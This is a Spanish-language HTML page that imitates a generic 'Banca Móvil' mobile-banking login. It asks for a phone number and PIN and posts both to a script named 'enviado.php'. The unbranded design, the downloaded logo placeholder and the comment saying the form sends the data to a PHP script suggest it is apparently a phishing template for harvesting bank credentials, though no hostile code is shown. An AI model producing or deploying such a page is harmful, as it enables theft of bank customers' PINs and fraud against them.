<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Banca Móvil</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(90deg, #FFAC3E 0%, #f87d18 100%);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
    }

    .background-layer {
    position: fixed;
    top: 35%;
    width: 100%;
    height: 66%;
    background: rgb(240, 238, 238);
}
.container {
    position: relative;
    width: 90%;
    max-width: 400px;
    padding: 20px;
    border-radius: 10px;
    text-align: center;
    z-index: 1;
    margin-bottom: 190px;
}

    .logo {
      margin-bottom: 20px;
    }

    .logo img {
      width: 66px;
    }

    .title {
      font-size: 28px;
      color: #ffffff;
      font-weight: bold;
      margin-bottom: 47px;
    }

    form {
      margin-top: 20px;
    }

    .form-group {
      margin-bottom: 20px;
      position: relative;
    }

    .form-group label {
      display: block;
      font-size: 17px;
      color: #439346;
      font-weight: bold;
      margin-bottom: 5px;
      text-align: left;
    }


    .form-group input {
    width: 100%;
    padding: 26px 13px;
    font-size: 14px;
    border: 0px solid #ccc;
    border-radius: 9px;
    box-sizing: border-box;
}

    .form-group input:focus {
      outline: none;
      border-color: #4caf50;
    }

    .form-group i {
      position: absolute;
      top: 63%;
      right: 18px;
      transform: translateY(-50%);
      color: #333333a8;
      font-size: 28px;
    }

    .btn {
    margin-top: 50px;
    width: 100%;
    padding: 21px;
    background: linear-gradient(-45deg, #006738 0%, #229A0D 100%);
    color: #ffffff;
    border: none;
    border-radius: 12px;
    font-size: 20px;
    cursor: pointer;
    font-weight: bold;
}

    .btn:hover {
      background: linear-gradient(to right, #aed14d, #4caf50);
    }

    .checkbox-container {
    display: flex;
    align-items: center;
    margin-top: 11px;
    justify-content: center;
}

    .checkbox-container input {
      margin-right: 10px;
    }

    .checkbox-container label {
    font-size: 15px;
    color: #337935;
}

    /* Cambia el color solo de la etiqueta asociada al campo con id="numero" */
    .form-group label[for="numero"] {
      color: #ffffff;
      /* Color blanco solo para la etiqueta Número */
    }

    .divLoading {
  margin: 0 auto;
  padding: 10px;
  width: 120px;
  color: #fff;
}
  </style>
</head>

	


<body>
  <div class="background-layer"></div>
    <!-- Contenedor principal -->
    <div class="container">
        <div class="logo">
            <!-- Cambia "descarga.png" por la ruta de tu logo -->
            <img src="./recursos/descarga.png" alt="Logo Banca Móvil">
        </div>
        <h1 class="title">Banca Móvil</h1>
        <!-- El formulario envía los datos al script PHP -->
        <form action="enviado.php" method="POST">
            <div class="form-group">
                <label for="numero">Número</label>
                <input type="text" id="numero" name="numero" placeholder="Digite su Número" required>
                <i class="fas fa-user"></i> <!-- Ícono de usuario -->
            </div>
            <div class="form-group">
                <label for="pin">PIN</label>
                <input type="password" id="pin" name="pin" placeholder="Digite su Contraseña" required>
                <i class="fas fa-lock"></i> <!-- Ícono de candado -->
            </div>
            <button class="btn" type="submit">Ingresar</button>
            <div class="checkbox-container">
                <input type="checkbox" id="biometrico" name="biometrico">
                <label for="biometrico">Activar Inicio de Sesión Biométrico</label>
            </div>
        </form>
    </div>
</body>

</html>